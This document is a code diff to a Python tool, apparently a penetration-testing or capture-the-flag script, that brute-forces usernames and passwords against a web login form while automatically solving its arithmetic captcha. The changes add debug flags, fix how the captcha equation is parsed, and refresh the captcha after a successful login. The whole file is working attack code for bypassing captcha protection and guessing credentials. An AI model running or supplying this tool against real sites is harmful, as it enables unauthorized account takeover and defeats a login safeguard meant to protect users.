@@ -24,6 +24,7 @@ print("####### ## ### #### ##### ### ##### ##### #########")
 print("#######    ### #### ##### ### ##    ##    #########")
 print("###################################################")
 print("Author: cy-baz")
+print("Version: 0.1")
 ###
 
 # Arguments for the script
@@ -38,6 +39,9 @@ parser.add_argument('-cp',dest='captchaParam', help="Name of capture parameter",
 parser.add_argument('-m',dest='matchEq', help="String to match after/before the equation is specified. This string should only occur once in the response.",default="= ?")
 parser.add_argument('-off',dest='offChange',type=int, default=12, help="Number of characters to look at prior to the matchEq string for the equation")
 parser.add_argument('-d',dest='direction', default="before", help="Decides if the offset should be before or after the specified string")
+parser.add_argument('-vP',dest='viewPayload', help="Check the payload to see if the details are as expected")
+parser.add_argument('-vR',dest='viewResponse', help="Recieve the response of all payloads")
+parser.add_argument('-vM',dest='viewMath', help="Check the string being treated as the equation to see if the '-m', '-off' and '-d' have found it. Using this with -viewPayload will help see what the 'equation' is and what it sends to the 'payload'")
 args = parser.parse_args()
 
 
@@ -47,6 +51,9 @@ user = args.user
 passwords = args.password
 error = args.error
 direction = args.direction
+viewPayload = args.viewPayload
+viewResponse = args.viewResponse
+viewMath = args.viewMath
 
 # URL Parameter check
 if not url:
@@ -71,15 +78,22 @@ offChange = args.offChange
 
 # Function to perform the arithmetic
 def arithmetic(p):
+
  # The location the captcha is found, based on the "= ?" being how it is identified
  offset = (p.text.find(matchEq))
+
  if direction == 'before':
   # Finding the equation before the "= ?", this might need tweaking based on the application/
   math = (p.text[offset-offChange:offset])
+
  elif direction == 'after':
-  ## If you find the equation after some string, use the following instead
-   math = (p.text[offset:offset+offChange])
- 
+  ## Len is used to make sure the offset is at the END of the specified string
+   math = (p.text[offset+len(matchEq):offset+offChange])
+
+ if viewMath is not None:
+  print(math)
+
+
  # Splitting the equation into 3 parts (2 numbers and an operator)
  try:
   msplit = (math.split())
@@ -117,18 +131,21 @@ def send(user,pw,result):
   }
  return(payload)
 
-# First payload to send
-payload = send('fakeUser','fakePassword',"FIRST")
+def baseRequest():
+ # First payload to send (and payload to send after a successful cred
+ payload = send('fakeUser','fakePassword',"FIRST")
 
-# First request, to get the captcha calculation
-with requests.Session() as s:
- p = s.post(url, data=payload)
- result = arithmetic(p)
+ # First request, to get the captcha calculation
+ with requests.Session() as s:
+  p = s.post(url, data=payload)
+  result = arithmetic(p)
+  return result
 
 ##################################### END OF FIRST REQUEST
 
 def brute_force(result):
  print("=== Brute forcing credentials while attempting to bypass captcha ===")
+ result = baseRequest()
  # Cycle through usernames and passwords
  with open(user) as user_file:
   print("- - - Cycling through users - - -")
@@ -141,15 +158,21 @@ def brute_force(result):
 
      # The payload to send (as defined in the send() function
      payload = send(username, password,result)
-
+     if viewPayload is not None:
+      print (payload)
      with requests.Session() as s:
       p = s.post(url, data=payload)
       result = arithmetic(p)
+      if viewResponse is not None:
+       print (p.text)
 
       # This is how we know if the credentials worked, more error checks can be added here if needed
-      if error not in p.text: # and "does not exist" not in p.text:
+      if error not in p.text and "does not exist" not in p.text:
        print ("+++ valid credentials: " + username + ":" + password)
        print (p.text) # Print the page response
+       
+       # Gets a valid captcha since a valid login doesn't recieve one (otherwise the next request would not work)
+       result = baseRequest()
 
 if __name__ =="__main__":
- brute_force(result)
+ brute_force(baseRequest())
